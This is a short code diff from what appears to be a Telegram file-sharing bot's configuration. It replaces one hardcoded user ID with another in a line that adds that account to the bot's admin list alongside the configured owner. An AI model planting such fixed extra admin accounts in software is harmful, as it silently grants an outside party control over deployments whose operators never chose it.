@@ -60,7 +60,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1721561586)
+ADMINS.append(5166575484)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
